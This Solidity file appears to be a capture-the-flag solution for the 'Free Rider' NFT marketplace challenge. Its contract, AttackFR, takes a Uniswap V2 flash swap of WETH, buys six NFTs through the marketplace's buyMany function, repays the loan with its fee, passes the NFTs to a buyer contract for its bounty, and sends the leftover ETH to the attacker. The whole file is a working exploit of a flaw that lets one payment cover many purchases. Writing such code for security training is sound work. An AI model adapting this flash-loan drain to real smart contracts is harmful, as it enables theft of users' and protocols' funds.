import "../free-rider/FreeRiderBuyer.sol";
import "../free-rider/FreeRiderNFTMarketplace.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IWETH {
    function deposit() external payable;

    function transfer(address to, uint256 value) external returns (bool);

    function withdraw(uint256) external;
}

contract AttackFR is IERC721Receiver {
    FreeRiderNFTMarketplace private immutable marketplace;
    IUniswapV2Pair private immutable pair;

    FreeRiderBuyer private immutable buyContract;

    IERC721 private immutable nft;
    address private immutable attacker;
    IWETH public weth;
    uint256[] tokenIds = [0, 1, 2, 3, 4, 5];

    constructor(
        address payable _marketplace,
        address _nft,
        address _pair,
        address payable _weth,
        address _buyContract
    ) {
        pair = IUniswapV2Pair(_pair);
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        buyContract = FreeRiderBuyer(_buyContract);
        nft = IERC721(_nft);
        attacker = msg.sender;
        weth = IWETH(_weth);
    }

    function attack(uint256 _amount) external {
        bytes memory _data = abi.encode(weth); // any arbitraty data to encode will do

        pair.swap(
            _amount, // amount of the WETH we are flash swapping
            0, // amount of tokens we are flash swapping, zero in this case
            address(this), // recipient of the loan
            _data // data that will be passed to the uniswapV2Call function that the pair triggers on the recipient address, this address
        );

        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(
                address(this),
                address(buyContract),
                tokenIds[i]
            );
        }

        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "ETH transfer failed");
    }

    function uniswapV2Call(
        address _sender,
        uint256 _amount0,
        uint256,
        bytes calldata
    ) external {
        require(
            msg.sender == address(pair),
            "Only WETH/DVT pair contract can call this function"
        );
        require(
            _sender == address(this),
            "Only this contract can execute the flashloan"
        );

        weth.withdraw(_amount0);
        marketplace.buyMany{value: address(this).balance}(tokenIds);
        uint256 _fee = 1 + ((_amount0) * 3) / 997; // 1+ is there in case the integer division equals zero.
        uint256 _repayAmount = _fee + _amount0;
        weth.deposit{value: _repayAmount}();
        weth.transfer(address(pair), _repayAmount);
    }

    receive() external payable {}

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external view override returns (bytes4) {
        require(msg.sender == address(nft));
        require(tx.origin == attacker);
        return IERC721Receiver.onERC721Received.selector;
    }
}
